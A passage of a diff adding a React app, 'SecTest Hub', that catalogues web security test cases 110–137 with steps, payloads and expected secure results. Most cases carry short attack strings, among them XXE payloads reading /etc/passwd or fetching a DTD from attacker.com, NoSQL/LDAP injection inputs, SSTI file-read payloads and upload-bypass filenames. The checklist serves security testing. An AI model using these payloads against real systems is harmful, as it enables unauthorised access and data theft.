+        High – financial loss.
+        `
+        }, {
+            id: 110,
+            category: 'Race Condition',
+            bugType: 'race-condition',
+            title: 'Race Condition – Balance Transfer',
+            markdown: `# Test Case 110 – Race Condition – Balance Transfer
+
+        ## Bug Type
+
+        \`race-condition\` · \`balance-transfer\`
+
+        ## Description
+
+        Test race condition in balance transfer.
+
+        ## Steps
+
+        1. Send balance transfer requests in parallel.
+        2. Check if balance is transferred multiple times.
+
+        ## Expected Result
+
+        Race conditions should be prevented.
+
+        ## Security Impact
+
+        Critical – financial loss.
+        `
+        }, {
+            id: 111,
+            category: 'Information Disclosure',
+            bugType: 'info-disclosure',
+            title: 'Information Disclosure – Error Messages',
+            markdown: `# Test Case 111 – Information Disclosure – Error Messages
+
+        ## Bug Type
+
+        \`info-disclosure\` · \`error-messages\`
+
+        ## Description
+
+        Test for sensitive information in error messages.
+
+        ## Steps
+
+        1. Trigger errors.
+        2. Check for sensitive information.
+        3. Stack traces, DB errors, file paths.
+
+        ## Expected Result
+
+        Error messages should be generic.
+
+        ## Security Impact
+
+        Medium – information leakage.
+        `
+        }, {
+            id: 112,
+            category: 'Information Disclosure',
+            bugType: 'info-disclosure',
+            title: 'Information Disclosure – Source Code',
+            markdown: `# Test Case 112 – Information Disclosure – Source Code
+
+        ## Bug Type
+
+        \`info-disclosure\` · \`source-code\`
+
+        ## Description
+
+        Test for source code exposure.
+
+        ## Steps
+
+        1. Check for .git, .svn, .env files.
+        2. Check for backup files (.bak, .swp).
+        3. Check for .htaccess, .htpasswd.
+
+        ## Expected Result
+
+        Sensitive files should be inaccessible.
+
+        ## Security Impact
+
+        High – source code exposure.
+        `
+        }, {
+            id: 113,
+            category: 'Information Disclosure',
+            bugType: 'info-disclosure',
+            title: 'Information Disclosure – Directory Listing',
+            markdown: `# Test Case 113 – Information Disclosure – Directory Listing
+
+        ## Bug Type
+
+        \`info-disclosure\` · \`directory-listing\`
+
+        ## Description
+
+        Test for directory listing.
+
+        ## Steps
+
+        1. Check if directory listing is enabled.
+        2. Access sensitive directories.
+
+        ## Expected Result
+
+        Directory listing should be disabled.
+
+        ## Security Impact
+
+        Medium – information leakage.
+        `
+        }, {
+            id: 114,
+            category: 'Weak Password Policy',
+            bugType: 'weak-password',
+            title: 'No Password Length Restriction',
+            markdown: `# Test Case 114 – No Password Length Restriction
+
+        ## Bug Type
+
+        \`weak-password\` · \`no-length-limit\`
+
+        ## Description
+
+        Test for password length restrictions.
+
+        ## Steps
+
+        1. Register with extremely long password (1000+ chars).
+        2. Check if accepted.
+        3. Check response time.
+
+        ## Expected Result
+
+        Password length should be limited.
+
+        ## Security Impact
+
+        Low – DoS risk.
+        `
+        }, {
+            id: 115,
+            category: 'Weak Password Policy',
+            bugType: 'weak-password',
+            title: 'Common Passwords Allowed',
+            markdown: `# Test Case 115 – Common Passwords Allowed
+
+        ## Bug Type
+
+        \`weak-password\` · \`common-passwords\`
+
+        ## Description
+
+        Test whether common passwords are allowed.
+
+        ## Testing
+
+        - \`password\`
+        - \`123456\`
+        - \`admin\`
+        - \`qwerty\`
+
+        ## Expected Result
+
+        Common passwords should be rejected.
+
+        ## Security Impact
+
+        High – weak credentials.
+        `
+        }, {
+            id: 116,
+            category: 'Weak Password Policy',
+            bugType: 'weak-password',
+            title: 'No Password Complexity',
+            markdown: `# Test Case 116 – No Password Complexity
+
+        ## Bug Type
+
+        \`weak-password\` · \`no-complexity\`
+
+        ## Description
+
+        Test for password complexity requirements.
+
+        ## Testing
+
+        - Lowercase only
+        - No special characters
+        - No numbers
+
+        ## Expected Result
+
+        Password complexity should be enforced.
+
+        ## Security Impact
+
+        High – weak credentials.
+        `
+        }, {
+            id: 117,
+            category: 'IDOR',
+            bugType: 'idor',
+            title: 'IDOR – Profile Access',
+            markdown: `# Test Case 117 – IDOR – Profile Access
+
+        ## Bug Type
+
+        \`idor\` · \`profile-access\`
+
+        ## Description
+
+        Test IDOR in profile access.
+
+        ## Steps
+
+        1. Access profile with numeric ID.
+        2. Change ID to other users.
+        3. Access other profiles.
+
+        ## Expected Result
+
+        Authorization should be enforced.
+
+        ## Security Impact
+
+        High – unauthorized data access.
+        `
+        }, {
+            id: 118,
+            category: 'IDOR',
+            bugType: 'idor',
+            title: 'IDOR – File Access',
+            markdown: `# Test Case 118 – IDOR – File Access
+
+        ## Bug Type
+
+        \`idor\` · \`file-access\`
+
+        ## Description
+
+        Test IDOR in file access.
+
+        ## Steps
+
+        1. Access file with numeric ID.
+        2. Change ID.
+        3. Access other users' files.
+
+        ## Expected Result
+
+        Authorization should be enforced.
+
+        ## Security Impact
+
+        High – unauthorized file access.
+        `
+        }, {
+            id: 119,
+            category: 'IDOR',
+            bugType: 'idor',
+            title: 'IDOR – Password Reset',
+            markdown: `# Test Case 119 – IDOR – Password Reset
+
+        ## Bug Type
+
+        \`idor\` · \`password-reset\`
+
+        ## Description
+
+        Test IDOR in password reset.
+
+        ## Steps
+
+        1. Request password reset.
+        2. Intercept request.
+        3. Change user ID/email.
+        4. Reset other user's password.
+
+        ## Expected Result
+
+        Authorization should be enforced.
+
+        ## Security Impact
+
+        Critical – account takeover.
+        `
+        }, {
+            id: 120,
+            category: 'Mass Assignment',
+            bugType: 'mass-assignment',
+            title: 'Mass Assignment – User Role',
+            markdown: `# Test Case 120 – Mass Assignment – User Role
+
+        ## Bug Type
+
+        \`mass-assignment\` · \`role\`
+
+        ## Description
+
+        Test mass assignment for user role.
+
+        ## Steps
+
+        1. Create account.
+        2. Intercept request.
+        3. Add \`role=admin\`.
+        4. Check if role is assigned.
+
+        ## Expected Result
+
+        Mass assignment should be prevented.
+
+        ## Security Impact
+
+        Critical – privilege escalation.
+        `
+        }, {
+            id: 121,
+            category: 'Mass Assignment',
+            bugType: 'mass-assignment',
+            title: 'Mass Assignment – Email Verification',
+            markdown: `# Test Case 121 – Mass Assignment – Email Verification
+
+        ## Bug Type
+
+        \`mass-assignment\` · \`verified\`
+
+        ## Description
+
+        Test mass assignment for email verification.
+
+        ## Steps
+
+        1. Create account.
+        2. Intercept request.
+        3. Add \`verified=true\`.
+        4. Check if email is verified.
+
+        ## Expected Result
+
+        Mass assignment should be prevented.
+
+        ## Security Impact
+
+        High – email verification bypass.
+        `
+        }, {
+            id: 122,
+            category: 'Security Misconfiguration',
+            bugType: 'sec-misconfig',
+            title: 'Missing Security Headers',
+            markdown: `# Test Case 122 – Missing Security Headers
+
+        ## Bug Type
+
+        \`sec-misconfig\` · \`missing-headers\`
+
+        ## Description
+
+        Test for missing security headers.
+
+        ## Check for:
+
+        - \`X-Frame-Options\`
+        - \`X-XSS-Protection\`
+        - \`Content-Security-Policy\`
+        - \`Strict-Transport-Security\`
+
+        ## Expected Result
+
+        Security headers should be present.
+
+        ## Security Impact
+
+        Medium – increased attack surface.
+        `
+        }, {
+            id: 123,
+            category: 'Security Misconfiguration',
+            bugType: 'sec-misconfig',
+            title: 'Default Credentials',
+            markdown: `# Test Case 123 – Default Credentials
+
+        ## Bug Type
+
+        \`sec-misconfig\` · \`default-creds\`
+
+        ## Description
+
+        Test for default credentials.
+
+        ## Check for:
+
+        - \`admin/admin\`
+        - \`admin/password\`
+        - \`root/root\`
+
+        ## Expected Result
+
+        Default credentials should be disabled.
+
+        ## Security Impact
+
+        Critical – unauthorized access.
+        `
+        }, {
+            id: 124,
+            category: 'Security Misconfiguration',
+            bugType: 'sec-misconfig',
+            title: 'HTTP Methods Enabled',
+            markdown: `# Test Case 124 – HTTP Methods Enabled
+
+        ## Bug Type
+
+        \`sec-misconfig\` · \`http-methods\`
+
+        ## Description
+
+        Test for dangerous HTTP methods.
+
+        ## Testing
+
+        \`\`\`text
+        OPTIONS / HTTP/1.1
+        Host: target.com
+        \`\`\`
+
+        ## Check for:
+
+        - \`PUT\`
+        - \`DELETE\`
+        - \`TRACE\`
+        - \`CONNECT\`
+
+        ## Expected Result
+
+        Dangerous methods should be disabled.
+
+        ## Security Impact
+
+        Medium – increased attack surface.
+        `
+        }, {
+            id: 125,
+            category: 'SSL/TLS Issues',
+            bugType: 'ssl-tls',
+            title: 'Mixed Content',
+            markdown: `# Test Case 125 – Mixed Content
+
+        ## Bug Type
+
+        \`ssl-tls\` · \`mixed-content\`
+
+        ## Description
+
+        Test for mixed content issues.
+
+        ## Steps
+
+        1. Check if HTTPS page loads HTTP resources.
+        2. Scripts, images, CSS over HTTP.
+
+        ## Expected Result
+
+        All resources should use HTTPS.
+
+        ## Security Impact
+
+        Medium – MITM risk.
+        `
+        }, {
+            id: 126,
+            category: 'SSL/TLS Issues',
+            bugType: 'ssl-tls',
+            title: 'Weak SSL/TLS Ciphers',
+            markdown: `# Test Case 126 – Weak SSL/TLS Ciphers
+
+        ## Bug Type
+
+        \`ssl-tls\` · \`weak-ciphers\`
+
+        ## Description
+
+        Test for weak SSL/TLS ciphers.
+
+        ## Testing
+
+        \`\`\`text
+        openssl s_client -connect target.com:443 -cipher 'LOW:EXP:DES:RC4'
+        \`\`\`
+
+        ## Expected Result
+
+        Weak ciphers should be disabled.
+
+        ## Security Impact
+
+        Medium – encryption weakness.
+        `
+        }, {
+            id: 127,
+            category: 'Session Fixation',
+            bugType: 'session-fixation',
+            title: 'Session Fixation – URL',
+            markdown: `# Test Case 127 – Session Fixation – URL
+
+        ## Bug Type
+
+        \`session-fixation\` · \`url\`
+
+        ## Description
+
+        Test session fixation via URL parameters.
+
+        ## Steps
+
+        1. Get session ID.
+        2. Force victim to use that session ID.
+        3. Login as victim.
+
+        ## Expected Result
+
+        Session IDs should not be in URLs.
+
+        ## Security Impact
+
+        High – session fixation.
+        `
+        }, {
+            id: 128,
+            category: 'Session Fixation',
+            bugType: 'session-fixation',
+            title: 'Session Fixation – Cookie',
+            markdown: `# Test Case 128 – Session Fixation – Cookie
+
+        ## Bug Type
+
+        \`session-fixation\` · \`cookie\`
+
+        ## Description
+
+        Test session fixation via cookies.
+
+        ## Steps
+
+        1. Set session cookie.
+        2. Force victim's browser to use it.
+        3. Login as victim.
+
+        ## Expected Result
+
+        Session cookies should be regenerated on login.
+
+        ## Security Impact
+
+        High – session fixation.
+        `
+        }, {
+            id: 129,
+            category: 'Insecure File Upload',
+            bugType: 'file-upload',
+            title: 'File Upload – Unrestricted',
+            markdown: `# Test Case 129 – File Upload – Unrestricted
+
+        ## Bug Type
+
+        \`file-upload\` · \`unrestricted\`
+
+        ## Description
+
+        Test for unrestricted file upload.
+
+        ## Steps
+
+        1. Upload PHP, JSP, ASP files.
+        2. Check if executed on server.
+        3. Access uploaded file.
+
+        ## Expected Result
+
+        File types should be restricted.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }, {
+            id: 130,
+            category: 'Insecure File Upload',
+            bugType: 'file-upload',
+            title: 'File Upload – Content-Type Bypass',
+            markdown: `# Test Case 130 – File Upload – Content-Type Bypass
+
+        ## Bug Type
+
+        \`file-upload\` · \`content-type-bypass\`
+
+        ## Description
+
+        Test content-type bypass in file upload.
+
+        ## Steps
+
+        1. Upload PHP file with image content-type.
+        2. Check if bypass works.
+        3. Execute uploaded file.
+
+        ## Expected Result
+
+        Content-type validation should be robust.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }, {
+            id: 131,
+            category: 'Insecure File Upload',
+            bugType: 'file-upload',
+            title: 'File Upload – Extension Bypass',
+            markdown: `# Test Case 131 – File Upload – Extension Bypass
+
+        ## Bug Type
+
+        \`file-upload\` · \`extension-bypass\`
+
+        ## Description
+
+        Test extension bypass in file upload.
+
+        ## Examples
+
+        - \`shell.php.jpg\`
+        - \`shell.php%00.jpg\`
+        - \`shell.php;.jpg\`
+
+        ## Expected Result
+
+        Extension validation should be robust.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }, {
+            id: 132,
+            category: 'XXE',
+            bugType: 'xxe',
+            title: 'XXE – Basic',
+            markdown: `# Test Case 132 – XXE – Basic
+
+        ## Bug Type
+
+        \`xxe\` · \`basic\`
+
+        ## Description
+
+        Test basic XXE.
+
+        ## Payload
+
+        \`\`\`xml
+        <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
+        <root>&test;</root>
+        \`\`\`
+
+        ## Expected Result
+
+        XXE should be blocked.
+
+        ## Security Impact
+
+        High – file disclosure.
+        `
+        }, {
+            id: 133,
+            category: 'XXE',
+            bugType: 'xxe',
+            title: 'XXE – Out-of-Band',
+            markdown: `# Test Case 133 – XXE – Out-of-Band
+
+        ## Bug Type
+
+        \`xxe\` · \`oob\`
+
+        ## Description
+
+        Test out-of-band XXE.
+
+        ## Payload
+
+        \`\`\`xml
+        <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY % payload SYSTEM "http://attacker.com/evil.dtd">%payload;]>
+        \`\`\`
+
+        ## Expected Result
+
+        XXE should be blocked.
+
+        ## Security Impact
+
+        High – data exfiltration.
+        `
+        }, {
+            id: 134,
+            category: 'LDAP Injection',
+            bugType: 'ldap-injection',
+            title: 'LDAP Injection – Basic',
+            markdown: `# Test Case 134 – LDAP Injection – Basic
+
+        ## Bug Type
+
+        \`ldap-injection\` · \`basic\`
+
+        ## Description
+
+        Test basic LDAP injection.
+
+        ## Examples
+
+        \`\`\`text
+        *)(&
+        *)(uid=*
+        admin)(&)
+        \`\`\`
+
+        ## Expected Result
+
+        LDAP injection should be blocked.
+
+        ## Security Impact
+
+        High – LDAP query manipulation.
+        `
+        }, {
+            id: 135,
+            category: 'NoSQL Injection',
+            bugType: 'nosql-injection',
+            title: 'NoSQL Injection – MongoDB',
+            markdown: `# Test Case 135 – NoSQL Injection – MongoDB
+
+        ## Bug Type
+
+        \`nosql-injection\` · \`mongodb\`
+
+        ## Description
+
+        Test NoSQL injection in MongoDB.
+
+        ## Examples
+
+        \`\`\`text
+        {$gt: ''}
+        {$ne: null}
+        $or: [{}, {}]
+        \`\`\`
+
+        ## Testing
+
+        \`\`\`text
+        username[$ne]=null&password[$ne]=null
+        \`\`\`
+
+        ## Expected Result
+
+        NoSQL injection should be blocked.
+
+        ## Security Impact
+
+        High – authentication bypass.
+        `
+        }, {
+            id: 136,
+            category: 'SSTI',
+            bugType: 'ssti',
+            title: 'SSTI – Basic',
+            markdown: `# Test Case 136 – SSTI – Basic
+
+        ## Bug Type
+
+        \`ssti\` · \`basic\`
+
+        ## Description
+
+        Test basic SSTI.
+
+        ## Examples
+
+        \`\`\`text
+        {{7*7}}
+        ${7*7}
+        <%=7*7%>
+        ${{7*7}}
+        #{7*7}
+        {{ '7'*7 }}
+        {{{{7*7}}}}
+        \`\`\`
+
+        ## Expected Result
+
+        SSTI should be blocked.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }, {
+            id: 137,
+            category: 'SSTI',
+            bugType: 'ssti',
+            title: 'SSTI – RCE',
+            markdown: `# Test Case 137 – SSTI – RCE
+
+        ## Bug Type
+
+        \`ssti\` · \`rce\`
+
+        ## Description
+
+        Test SSTI leading to RCE.
+
+        ## Examples
+
+        \`\`\`text
+        {{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+        {{ config.items() }}
+        {{ self.__class__.__mro__[1].__subclasses__() }}
+        \`\`\`
+
+        ## Expected Result
+
+        SSTI leading to RCE should be blocked.
+
+        ## Security Impact
+
+        Critical – RCE.
+        `
+        }];
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  HELPERS
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        function getCategoryColor(cat) {
+            const map = {
+                'Email Verification Bypass': 'badge-category',
+                'Password Reset Flaw': 'badge-category',
+                'Session Management': 'badge-category',
+                '2FA Bypass': 'badge-category',
+                'CSRF': 'badge-category',
+                'Brute Force Attacks': 'badge-category',
+                'CORS Misconfiguration': 'badge-category',
+                'HTTP Response Splitting/CRLF Injection': 'badge-category',
+                'Open Redirect': 'badge-category',
+                '403 Bypass': 'badge-category',
+                'SSRF': 'badge-category',
+                'Business Logic Flaws': 'badge-category',
+                'WAF Bypass': 'badge-category',
+                'S3 Bucket Misconfiguration': 'badge-category',
+                'XSS': 'badge-category',
+                'SQL Injection': 'badge-category',
+                'Command Injection': 'badge-category',
+                'File Inclusion': 'badge-category',
+                'Account Takeover': 'badge-category',
+                'Clickjacking': 'badge-category',
+                'Race Condition': 'badge-category',
+                'Information Disclosure': 'badge-category',
+                'Weak Password Policy': 'badge-category',
+                'IDOR': 'badge-category',
+                'Mass Assignment': 'badge-category',
+                'Security Misconfiguration': 'badge-category',
+                'SSL/TLS Issues': 'badge-category',
+                'Session Fixation': 'badge-category',
+                'Insecure File Upload': 'badge-category',
+                'XXE': 'badge-category',
+                'LDAP Injection': 'badge-category',
+                'NoSQL Injection': 'badge-category',
+                'SSTI': 'badge-category',
+            };
+            return map[cat] || 'badge-category';
+        }
+
+        function getSeverity(id) {
+            if ([6, 16, 37, 87, 96, 97, 100, 101, 103, 104, 110, 119, 120, 123, 129, 130, 131, 136, 137].includes(id))
+                return 'Critical';
+            if ([1, 2, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34,
+                    35, 41, 42, 46, 47, 48, 49, 50, 51, 52, 53, 55, 59, 61, 62, 63, 64, 65, 66, 67, 70, 71, 72, 73, 74, 75,
+                    76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 91, 92, 93, 94, 95, 98, 99, 105, 107, 109, 112, 115,
+                    116, 117, 118, 121, 132, 133, 134, 135
+                ].includes(id))
+                return 'High';
+            if ([3, 5, 20, 28, 36, 39, 40, 43, 44, 45, 54, 56, 57, 58, 60, 68, 69, 89, 90, 106, 108, 111, 113, 114, 122,
+                    124, 125, 126
+                ].includes(id))
+                return 'Medium';
+            return 'Low';
+        }
+
+        function getSeverityClass(sev) {
+            if (sev === 'Critical') return 'badge-severity';
+            if (sev === 'High') return 'badge-severity';
+            if (sev === 'Medium') return 'badge-severity';
+            return 'badge-severity';
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  THEME CONTEXT
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        const ThemeContext = createContext();
+
+        function ThemeProvider({ children }) {
+            const [theme, setTheme] = useState(() => {
+                const saved = localStorage.getItem('sectest-theme');
+                return saved || 'dark';
+            });
+            useEffect(() => {
+                document.documentElement.classList.toggle('light-theme', theme === 'light');
+                localStorage.setItem('sectest-theme', theme);
+            }, [theme]);
+            return (
+                <ThemeContext.Provider value={{ theme, toggle: () => setTheme(t => t === 'dark' ? 'light' :
+                        'dark') }}>
+                    {children}
+                </ThemeContext.Provider>
+            );
+        }
+
+        function useTheme() { return useContext(ThemeContext); }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  MARKDOWN COMPONENTS
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        function CodeBlock({ node, inline, className, children, ...props }) {
+            const match = /language-(\w+)/.exec(className || '');
+            const lang = match ? match[1] : '';
+            const code = String(children).replace(/\n$/, '');
+            const [copied, setCopied] = useState(false);
+
+            const handleCopy = useCallback(() => {
+                navigator.clipboard.writeText(code).then(() => {
+                    setCopied(true);
+                    setTimeout(() => setCopied(false), 1600);
+                }).catch(() => {});
+            }, [code]);
+
+            if (inline) {
+                return <code className={className} {...props}>{children}</code>;
+            }
+
+            return (
+                <div className="code-block">
+                    <div className="code-header">
+                        <span className="lang-label">{lang || 'text'}</span>
+                        <button className={`copy-btn ${copied ? 'copied' : ''}`} onClick={handleCopy}>
+                            {copied ? '✓ Copied' : '📋 Copy'}
+                        </button>
+                    </div>
+                    <pre>
+                        <code className={className} {...props}>
+                            {children}
+                        </code>
+                    </pre>
+                </div>
+            );
+        }
+
+        function MarkdownRenderer({ content }) {
+            if (!content) return null;
+            return (
+                <ReactMarkdown
+                    className="markdown-body"
+                    remarkPlugins={[remarkGfm]}
+                    rehypePlugins={[rehypeHighlight]}
+                    components={{
+                        code: CodeBlock,
+                        a({ href, children, ...props }) {
+                            const isExternal = href && (href.startsWith('http') || href.startsWith('//'));
+                            return (
+                                <a href={href} target={isExternal ? '_blank' : undefined}
+                                rel={isExternal ? 'noopener noreferrer' : undefined} {...props}>
+                                    {children}
+                                </a>
+                            );
+                        }
+                    }}
+                >
+                    {content}
+                </ReactMarkdown>
+            );
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  APP
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        function App() {
+            const { theme, toggle } = useTheme();
+            const [selectedId, setSelectedId] = useState(1);
+            const [searchTerm, setSearchTerm] = useState('');
+            const [rawMode, setRawMode] = useState(false);
+            const [drawerOpen, setDrawerOpen] = useState(false);
+            const [expandedCategories, setExpandedCategories] = useState(() => {
+                const all = [...new Set(TEST_CASES.map(t => t.category))];
+                return Object.fromEntries(all.map(c => [c, true]));
+            });
+            const contentRef = useRef(null);
+
+            const selected = TEST_CASES.find(t => t.id === selectedId) || TEST_CASES[0];
+
+            const filtered = useMemo(() => {
+                const term = searchTerm.toLowerCase().trim();
+                if (!term) return TEST_CASES;
+                return TEST_CASES.filter(t =>
+                    t.title.toLowerCase().includes(term) ||
+                    t.category.toLowerCase().includes(term) ||
+                    t.bugType.toLowerCase().includes(term) ||
+                    t.markdown.toLowerCase().includes(term) ||
+                    String(t.id).includes(term)
+                );
+            }, [searchTerm]);
+
+            const categories = useMemo(() => {
+                const map = {};
+                filtered.forEach(t => {
+                    if (!map[t.category]) map[t.category] = [];
+                    map[t.category].push(t);
+                });
+                return map;
+            }, [filtered]);
+
+            const toggleCategory = (cat) => {
+                setExpandedCategories(prev => ({ ...prev, [cat]: !prev[cat] }));
+            };
+
+            const getToc = (markdown) => {
+                const lines = markdown.split('\n');
+                const headings = [];
+                let inCode = false;
+                for (const line of lines) {
+                    if (line.trim().startsWith('```')) { inCode = !inCode; continue; }
+                    if (inCode) continue;
+                    const match = line.match(/^(#{2,3})\s+(.*)/);
+                    if (match) {
+                        const level = match[1].length;
+                        const text = match[2].trim();
+                        const id = text.toLowerCase().replace(/[^a-z0-9]+/g, '-');
+                        headings.push({ level, text, id });
+                    }
+                }
+                return headings;
+            };
+
+            const toc = useMemo(() => getToc(selected.markdown), [selected]);
+
+            const handlePrev = () => {
+                const idx = TEST_CASES.findIndex(t => t.id === selectedId);
+                if (idx > 0) { setSelectedId(TEST_CASES[idx - 1].id);
+                    setDrawerOpen(false); }
+            };
+            const handleNext = () => {
+                const idx = TEST_CASES.findIndex(t => t.id === selectedId);
+                if (idx < TEST_CASES.length - 1) { setSelectedId(TEST_CASES[idx + 1].id);
+                    setDrawerOpen(false); }
+            };
+
+            const currentIdx = TEST_CASES.findIndex(t => t.id === selectedId);
+
+            // Scroll to top when selected changes
+            useEffect(() => {
+                if (contentRef.current) {
+                    contentRef.current.scrollTop = 0;
+                }
+                setRawMode(false);
+            }, [selectedId]);
+
+            // Close drawer on escape
+            useEffect(() => {
+                const handler = (e) => { if (e.key === 'Escape') setDrawerOpen(false); };
+                document.addEventListener('keydown', handler);
+                return () => document.removeEventListener('keydown', handler);
+            }, []);
+
+            // Copy entire markdown
+            const copyMarkdown = useCallback(() => {
+                navigator.clipboard.writeText(selected.markdown).catch(() => {});
+            }, [selected]);
+
+            const renderSidebar = () => (
+                <div className="sidebar">
+                    <div className="sidebar-title">
+                        <span>⚡</span> SecTest<span>Hub</span>
+                    </div>
+                    <div className="sidebar-search">
+                        <span className="icon">🔍</span>
+                        <input
+                            type="text"
+                            placeholder="Search test cases..."
+                            value={searchTerm}
+                            onChange={(e) => setSearchTerm(e.target.value)}
+                        />
+                    </div>
+                    <div style={{ flex: 1, overflowY: 'auto' }}>
+                        {Object.keys(categories).length === 0 ? (
+                            <div className="no-results">No matching test cases.</div>
+                        ) : (
+                            Object.entries(categories).map(([cat, items]) => (
+                                <div className="category-group" key={cat}>
+                                    <div className="category-header" onClick={() => toggleCategory(cat)}>
+                                        <span className={`arrow ${expandedCategories[cat] ? 'open' : ''}`}>▶</span>
+                                        {cat}
+                                        <span className="count">{items.length}</span>
+                                    </div>
+                                    <div className={`test-list ${expandedCategories[cat] ? 'open' : ''}`}>
+                                        {items.map(t => (
+                                            <div
+                                                key={t.id}
+                                                className={`test-item ${t.id === selectedId ? 'active' : ''}`}
+                                                onClick={() => { setSelectedId(t.id);
+                                                    setDrawerOpen(false); }}
+                                            >
+                                                <span className="num">#{t.id}</span>
+                                                <span className="title">{t.title}</span>
+                                            </div>
+                                        ))}
+                                    </div>
+                                </div>
+                            ))
+                        )}
+                    </div>
+                </div>
+            );
+
+            return (
+                <div style={{ display: 'flex', flexDirection: 'column', height: '100vh', background: theme === 'dark' ?
+                        '#0d0d0f' : '#f5f5f7' }}>
+                    {/* Header */}
+                    <header className="app-header">
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                            <button className="hamburger" onClick={() => setDrawerOpen(true)}>☰</button>
+                            <div className="brand">
+                                <span>⚡</span> SecTest<span>Hub</span>
+                            </div>
+                        </div>
+                        <div className="header-actions">
+                            <button
+                                className={`raw-toggle ${rawMode ? 'active' : ''}`}
+                                onClick={() => setRawMode(!rawMode)}
+                                title="Toggle raw Markdown view"
+                            >
+                                {rawMode ? '📄 Raw' : '📄 Raw'}
+                            </button>
+                            <button
+                                className="theme-toggle"
+                                onClick={toggle}
+                                title={theme === 'dark' ? 'Switch to light theme' : 'Switch to dark theme'}
+                            >
+                                {theme === 'dark' ? '☀️ Light' : '🌙 Dark'}
+                            </button>
+                            <button
+                                className="theme-toggle"
+                                onClick={copyMarkdown}
+                                title="Copy Markdown source"
+                                style={{ fontSize: '13px' }}
+                            >
+                                📋 Copy MD
+                            </button>
+                        </div>
+                    </header>
+
+                    {/* Layout */}
+                    <div className="app-layout">
+                        {/* Desktop sidebar */}
+                        <div style={{ display: 'block' }} className="sidebar-desktop">
+                            {renderSidebar()}
+                        </div>
+
+                        {/* Content */}
+                        <div className="content-area" ref={contentRef}>
+                            <div className="content-inner">
+                                {/* Navigation */}
+                                <div className="nav-row">
+                                    <button className="nav-btn" onClick={handlePrev} disabled={currentIdx <= 0}>
+                                        ← Previous
+                                    </button>
+                                    <span style={{ fontSize: '13px', color: '#5a5a6a' }}>
+                                        {selected.id} / {TEST_CASES.length}
+                                    </span>
+                                    <button className="nav-btn" onClick={handleNext} disabled={currentIdx >= TEST_CASES
+                                            .length - 1}>
+                                        Next →
+                                    </button>
+                                </div>
+
+                                {/* Badges */}
+                                <div style={{ marginBottom: '16px', display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
+                                    <span className="badge">#{selected.id}</span>
+                                    <span className={`badge ${getCategoryColor(selected.category)}`}>
+                                        📂 {selected.category}
+                                    </span>
+                                    <span className="badge badge-bugtype">🐛 {selected.bugType}</span>
+                                    <span className={`badge ${getSeverityClass(getSeverity(selected.id))}`}>
+                                        ⚡ {getSeverity(selected.id)}
+                                    </span>
+                                </div>
+
+                                {/* TOC */}
+                                {toc.length > 0 && !rawMode && (
+                                    <div className="toc">
+                                        <div className="toc-title">📑 On This Page</div>
+                                        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px 16px' }}>
+                                            {toc.map(h => (
+                                                <a key={h.id} href={`#${h.id}`}
+                                                onClick={(e) => { e.preventDefault();
+                                                    const el = document.getElementById(h.id);
+                                                    if (el && contentRef.current) {
+                                                        const top = el.offsetTop - 80;
+                                                        contentRef.current.scrollTo({ top, behavior: 'smooth' });
+                                                    } }}>
+                                                    {h.text}
+                                                </a>
+                                            ))}
+                                        </div>
+                                    </div>
+                                )}
+
+                                {/* Markdown or Raw */}
+                                {rawMode ? (
+                                    <>
+                                        <div style={{ display: 'flex', justifyContent: 'flex-end', marginBottom: '8px' }}>
+                                            <button className="copy-btn" onClick={copyMarkdown}
+                                            style={{ fontSize: '13px', padding: '4px 14px', border: '1px solid #2a2a30',
+                                                    borderRadius: '6px' }}>
+                                                📋 Copy Markdown
+                                            </button>
+                                        </div>
+                                        <div className="raw-viewer">
+                                            {selected.markdown}
+                                        </div>
+                                    </>
+                                ) : (
+                                    <div id="markdown-content">
+                                        <MarkdownRenderer content={selected.markdown} />
+                                    </div>
+                                )}
+
+                                {/* Bottom nav */}
+                                <div className="nav-row" style={{ marginTop: '32px', borderTop: '1px solid #1a1a22',
+                                        borderBottom: 'none', paddingTop: '20px' }}>
+                                    <button className="nav-btn" onClick={handlePrev} disabled={currentIdx <= 0}>
+                                        ← Previous
+                                    </button>
+                                    <span style={{ fontSize: '13px', color: '#5a5a6a' }}>
+                                        {selected.id} / {TEST_CASES.length}
+                                    </span>
+                                    <button className="nav-btn" onClick={handleNext} disabled={currentIdx >= TEST_CASES
+                                            .length - 1}>
+                                        Next →
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    {/* Mobile drawer */}
+                    <div className={`drawer-overlay ${drawerOpen ? 'open' : ''}`} onClick={() => setDrawerOpen(false)} />
+                    <div className={`drawer-sidebar ${drawerOpen ? 'open' : ''}`}>
+                        <button className="drawer-close" onClick={() => setDrawerOpen(false)}>✕</button>
+                        <div style={{ marginTop: '8px' }}>
+                            {renderSidebar()}
+                        </div>
+                    </div>
+
+                    <style>{`
+                .sidebar-desktop {
+                  display: block;
+                }
+                @media (max-width: 860px) {
+                  .sidebar-desktop {
+                    display: none !important;
+                  }
+                }
+                .light-theme .app-header {
+                  background: rgba(245,245,247,0.92);
+                }
+              `}</style>
+                </div>
+            );
+        }
+
